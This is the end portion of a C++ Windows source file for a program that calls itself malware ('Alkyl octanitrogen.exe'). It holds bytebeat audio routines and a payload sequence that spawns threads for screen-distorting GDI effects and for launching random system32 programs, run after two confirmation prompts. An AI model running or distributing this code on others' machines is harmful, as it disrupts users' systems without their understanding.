	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(255 & t * (int)cos(127 & t * (int)tan(234 & t >> 8 & t >> 3) >> (3 & t >> 14)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound5() {
	int nSamplesPerSec = 14444, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t ^ t >> t) * (15 & 0x78917891 >> (t >> 8 & 28)) + (t >> 1 >> (t >> 11) ^ t >> 12) + (t >> 4 & t & 24)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound6() {
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t + t >> 11 | (4 << t)) + (t ^ t >> (51 + t ^ t) << 4)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound7() {
	int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * 5) | ((t << 3 & t >> 6) | t >> 4 & t << 8) | t ^ t >> t * ((11 * t & 4 | t ^ 5) * (14 & t))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound8() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(127 * (int(t * 0.2) & ((int(t * 0.2) >> 4) | (int(t * 0.2) >> 5))) + 1);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound9() {
	int nSamplesPerSec = 11020, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t >> 10) | (t >> 8)) ^ t) * t & 0x7f);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound10() {
	int nSamplesPerSec = 8500, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (t ^ t >> t) & t >> 8) | t >> 3) + (2 * t));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound11() {
	int nSamplesPerSec = 11020, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (t ^ (t + (t >> 24)) ^ (((t * 4) ^ t) >> 10)) * t / 100000) ^ (int(sin(t & t | t ^ t))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound12() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 7) | (t >> 6) | t) * t & ((t >> 0xB) | (t >> 9)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound13() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((0xedfa95 >> (((t >> 9) & 0xe)) & 0xf) * t | (-t >> 8)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound14() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((11 & t * 4 & t >> 5) | (63 & t - 10 & t >> 10) - t % 5 | t * t)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound15() {//credits to N17Pro3426
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t >> 10) | (t >> 8)) & t) * t);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound16() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t * rand() & 8 * t * (t >> 7) + 20 | t >> t / 3);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound17() {
	int nSamplesPerSec = 9000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t << (t >> 1) % (1 << (7 * (t >> 6 & t >> 10 & 63) >> 3)) ^ t >> 5);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound18() {//credits to fr4ctalz
	int nSamplesPerSec = 9000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 8) * t & t << 4));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound19() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (0x123456 & (t >> 8))) | (t >> 3)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound20() {
	int nSamplesPerSec = 24000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t >> (t & 16384 ? 2 : 3) & t * (t >> 5 & t >> 7) | t * (t >> 4 | t >> 6 & t >> 8) & 36 | (1 >> t)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound21() {//credits to N17Pro3426
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (t >> 8 * (t >> 15 | t >> 8) & (20 | 5 ^ (t >> 19) >> t | t >> 3))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
void mainpayloads() {
	Sleep(5000);
	HANDLE thread0 = CreateThread(0, 0, msg, 0, 0, 0);
	Sleep(500);
	HANDLE thread1_num1 = CreateThread(0, 0, shader1, 0, 0, 0);
	HANDLE thread1_num2 = CreateThread(0, 0, icon1, 0, 0, 0);
	sound1();
	TerminateThread(thread1_num1, 0);
	refreshscr();
	HANDLE thread2_num1 = CreateThread(0, 0, shader2, 0, 0, 0);
	HANDLE thread2_num2 = CreateThread(0, 0, ballz, 0, 0, 0);
	sound2();
	TerminateThread(thread2_num1, 0);
	refreshscr();
	HANDLE thread3_num1 = CreateThread(0, 0, bitblt1, 0, 0, 0);
	HANDLE thread3_num2 = CreateThread(0, 0, icon2, 0, 0, 0);
	HANDLE thread3_num3 = CreateThread(0, 0, mixblt1, 0, 0, 0);
	HANDLE thread3_num4 = CreateThread(0, 0, circle, 0, 0, 0);
	sound3();
	TerminateThread(thread3_num1, 0);
	TerminateThread(thread3_num3, 0);
	TerminateThread(thread3_num4, 0);
	TerminateThread(thread2_num2, 0);
	refreshscr();
	HANDLE thread4_num1 = CreateThread(0, 0, shader3, 0, 0, 0);
	HANDLE thread4_num2 = CreateThread(0, 0, mixblt2, 0, 0, 0);
	sound4();
	TerminateThread(thread4_num1, 0);
	TerminateThread(thread4_num2, 0);
	refreshscr();
	HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
	sound5();
	TerminateThread(thread5, 0);
	refreshscr();
	HANDLE thread6 = CreateThread(0, 0, shader5, 0, 0, 0);
	sound6();
	TerminateThread(thread6, 0);
	refreshscr();
	HANDLE thread7 = CreateThread(0, 0, shader6, 0, 0, 0);
	sound7();
	TerminateThread(thread7, 0);
	refreshscr();
	HANDLE thread8 = CreateThread(0, 0, shader7, 0, 0, 0);
	CreateThread(0, 0, randsystem32program, 0, 0, 0);
	sound8();
	TerminateThread(thread8, 0);
	refreshscr();
	HANDLE thread9_num1 = CreateThread(0, 0, shader8, 0, 0, 0);
	HANDLE thread9_num2 = CreateThread(0, 0, text1, 0, 0, 0);
	sound9();
	TerminateThread(thread9_num1, 0);
	refreshscr();
	HANDLE thread10_num1 = CreateThread(0, 0, shader9a, 0, 0, 0);
	HANDLE thread10_num2 = CreateThread(0, 0, shader9b, 0, 0, 0);
	sound10();
	TerminateThread(thread10_num1, 0);
	TerminateThread(thread10_num2, 0);
	TerminateThread(thread1_num2, 0);
	refreshscr();
	HANDLE thread11 = CreateThread(0, 0, shader10, 0, 0, 0);
	sound11();
	TerminateThread(thread11, 0);
	refreshscr();
	HANDLE thread12_num1 = CreateThread(0, 0, bitblt2, 0, 0, 0);
	HANDLE thread12_num2 = CreateThread(0, 0, patblt1, 0, 0, 0);
	sound12();
	TerminateThread(thread12_num1, 0);
	TerminateThread(thread12_num2, 0);
	refreshscr();
	HANDLE thread13 = CreateThread(0, 0, shader11, 0, 0, 0);
	sound13();
	TerminateThread(thread13, 0);
	refreshscr();
	HANDLE thread14_num1 = CreateThread(0, 0, mixblt3, 0, 0, 0);
	HANDLE thread14_num2 = CreateThread(0, 0, stretchblt1, 0, 0, 0);
	sound14();
	TerminateThread(thread14_num1, 0);
	TerminateThread(thread14_num2, 0);
	refreshscr();
	HANDLE thread15_num1 = CreateThread(0, 0, mixblt4, 0, 0, 0);
	HANDLE thread15_num2 = CreateThread(0, 0, bitblt3, 0, 0, 0);
	HANDLE thread15_num3 = CreateThread(0, 0, bitblt4, 0, 0, 0);
	HANDLE thread15_num4 = CreateThread(0, 0, text2, 0, 0, 0);
	sound15();
	TerminateThread(thread15_num1, 0);
	TerminateThread(thread15_num2, 0);
	TerminateThread(thread15_num3, 0);
	refreshscr();
	HANDLE thread16_num1 = CreateThread(0, 0, shader12, 0, 0, 0);
	HANDLE thread16_num2 = CreateThread(0, 0, mixblt5, 0, 0, 0);
	sound16();
	TerminateThread(thread16_num1, 0);
	TerminateThread(thread16_num2, 0);
	refreshscr();
	HANDLE thread17_num1 = CreateThread(0, 0, gradientfilltriangle, 0, 0, 0);
	HANDLE thread17_num2 = CreateThread(0, 0, bitblt5, 0, 0, 0);
	sound17();
	TerminateThread(thread17_num1, 0);
	TerminateThread(thread17_num2, 0);
	refreshscr();
	HANDLE thread18 = CreateThread(0, 0, shader13, 0, 0, 0);
	sound18();
	TerminateThread(thread18, 0);
	refreshscr();
	HANDLE thread19_num1 = CreateThread(0, 0, bitblt6, 0, 0, 0);
	HANDLE thread19_num2 = CreateThread(0, 0, squarez, 0, 0, 0);
	sound19();
	TerminateThread(thread19_num1, 0);
	TerminateThread(thread19_num2, 0);
	refreshscr();
	HANDLE thread20 = CreateThread(0, 0, shader14, 0, 0, 0);
	sound20();
	TerminateThread(thread20, 0);
	refreshscr();
	HANDLE thread21 = CreateThread(0, 0, blackandwhite, 0, 0, 0);
	sound21();
	TerminateThread(thread21, 0);
	refreshscr();
	TerminateThread(thread3_num2, 0);
	TerminateThread(thread9_num2, 0);
	TerminateThread(thread15_num4, 0);
}
int main()
{
	InitDPI();
	srand(time(NULL));
	Seedxorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"Run malware?", L"Alkyl octanitrogen.exe", MB_YESNO | MB_ICONWARNING) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure?", L"Alkyl octanitrogen.exe", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			mainpayloads();
		}
	}
	return 0;
}